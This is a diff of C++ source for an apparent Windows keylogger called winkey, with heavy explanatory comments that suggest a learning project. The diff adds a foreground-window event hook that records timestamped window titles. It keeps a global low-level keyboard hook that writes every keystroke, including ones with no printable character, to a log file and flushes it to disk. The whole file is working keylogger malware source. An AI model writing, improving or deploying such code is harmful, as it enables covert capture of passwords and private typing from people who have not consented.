@@ -1,39 +1,42 @@
 #include "winkey.hpp"
 
-std::wofstream  logFile;
-HWND            lastWindow = nullptr;
-HANDLE          singleInstanceMutex = nullptr;
-HHOOK           keyboardHook = nullptr;
+std::wofstream  g_logFile;
 
-// Write the datetime + current active window name to the log file
-void LogForegroundWindow(void) {
-    // Get a handle to the currently focused window
-    HWND    hwnd = GetForegroundWindow();
-    // Only log if the focused window has changed
-    if (!hwnd || hwnd == lastWindow) return;
-    lastWindow = hwnd;
+// Write the timestamp + current active window name to the log file
+void CALLBACK WinEventProc(HWINEVENTHOOK /*hWinEventHook*/, DWORD event, HWND hwnd,
+    LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/)
+{
+    static HWND lastWindow = nullptr;
 
-    // We use wide characters (wchar_t) + Unicode (W) version of the function
-    wchar_t windowTitle[256];
-    GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
+    if (event == EVENT_SYSTEM_FOREGROUND) {
+        if (hwnd != lastWindow)
+        {
+            lastWindow = hwnd;
 
-    time_t      now = time(nullptr);
-    // Converts time_t into a tm structure representing the local time
-    //  (hours, minutes, day, month, etc.)
-    struct tm   localTime {};
-    if (localtime_s(&localTime, &now)) return;
+            // We use wide characters (wchar_t) + Unicode (W) version of the function
+            wchar_t windowTitle[256];
+            GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
 
-    // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
-    // `L` is for wide characters (Unicode)
-    logFile << std::endl; // Force new line before the entry
-    logFile << L"[" << std::setfill(L'0')
-            << std::setw(2) << localTime.tm_mday << L"."
-            << std::setw(2) << (localTime.tm_mon + 1) << L"."
-            << (localTime.tm_year + 1900) << L" "
-            << std::setw(2) << localTime.tm_hour << L":"
-            << std::setw(2) << localTime.tm_min << L":"
-            << std::setw(2) << localTime.tm_sec << L"] - '"
-            << windowTitle << L"'" << std::endl;
+            time_t      now = time(nullptr);
+            // Converts time_t into a tm structure representing the local time
+            //  (hours, minutes, day, month, etc.)
+            struct tm   localTime {};
+            if (localtime_s(&localTime, &now) == 0) {
+                // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
+                // `L` is for wide characters (Unicode)
+                g_logFile << std::endl; // Force new line before the entry
+                g_logFile << L"[" << std::setfill(L'0')
+                        << std::setw(2) << localTime.tm_mday << L"."
+                        << std::setw(2) << (localTime.tm_mon + 1) << L"."
+                        << (localTime.tm_year + 1900) << L" "
+                        << std::setw(2) << localTime.tm_hour << L":"
+                        << std::setw(2) << localTime.tm_min << L":"
+                        << std::setw(2) << localTime.tm_sec << L"] - '"
+                        << windowTitle << L"'" << std::endl;
+            }
+        }
+    }
+    return;
 }
 
 /*
@@ -52,7 +55,9 @@ void LogForegroundWindow(void) {
  *          - CALLBACK is a macro defining the calling convention of the function
  *              (specifies how parameters are passed and who cleans the stack).
  */
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
     /*
      * HC_ACTION        Process the event normally.
      * WM_KEYDOWN       Key pressed
@@ -89,17 +94,15 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         );
         buffer[result] = L'\0'; // Null-terminate
 
-        LogForegroundWindow();  // Check and log if new window
-
         /* Log character to file or, if no valid character was produced
          *  (like arrow keys, function keys), log a fallback string that includes
          *  the virtual key code.
          */
-        if (result > 0) logFile << buffer;
-        else logFile << GetKeyName(p->vkCode);
+        if (result > 0) g_logFile << buffer;
+        else g_logFile << GetKeyName(p->vkCode);
 
         // Ensure that everything written to the file is immediately pushed to disk
-        logFile.flush();
+        g_logFile.flush();
     }
 
     // Pass the event to the next hook
@@ -107,46 +110,56 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-int main(void) {
+int main(void)
+{
     // Prevent multiple instances of this program
-    singleInstanceMutex = CreateMutex(NULL, TRUE, TEXT(TW_MUTEX_NAME));
+    HANDLE  singleInstanceMutex = CreateMutex(NULL, TRUE, TEXT(TW_MUTEX_NAME));
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
         std::cerr << "Already running" << std::endl;
         return 1;
     }
 
     // Open the outfile in appending mode
-    logFile.open("winkey.log", std::ios::app);
-    if (!logFile.is_open()) {
+    g_logFile.open(TW_LOGFILE, std::ios::app);
+    if (!g_logFile.is_open()) {
         std::cerr << "Failed to open log file." << std::endl;
         //TODO clean quit
         return 1;
     }
 
+    // Set the event hook for foreground window changes (out-of-context)
+    HWINEVENTHOOK winEventHook = SetWinEventHook(
+        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
+        NULL,
+        WinEventProc,
+        0, 0,
+        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
+    );
+    if (!winEventHook) {
+        std::cerr << "Failed to set window event hook." << std::endl;
+        return 1;
+    }
+
     // Install global low-level keyboard hook to intercept keystrokes
-    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    HHOOK   keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
     if (!keyboardHook) {
         std::cerr << "Failed to set keyboard hook." << std::endl;
         return 1;
     }
 
     /*
-     * Message loop
-     *
-     * - MSG: structure holding message information from the message queue.
-     *  It includes data like message type (e.g., WM_KEYDOWN), window handle,
-     *  wParam, lParam, etc.
-     * 
-     * - GetMessage: blocks until a Windows message (like an event) is available.
+     * Main message loop
+     * Blocks until a Windows message (like an event) is available.
      */
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {}
 
     // Cleanup
+    UnhookWinEvent(winEventHook);
     UnhookWindowsHookEx(keyboardHook);
     CloseHandle(singleInstanceMutex);
-    logFile.close();
+    g_logFile.close();
 
     return 0;
 }
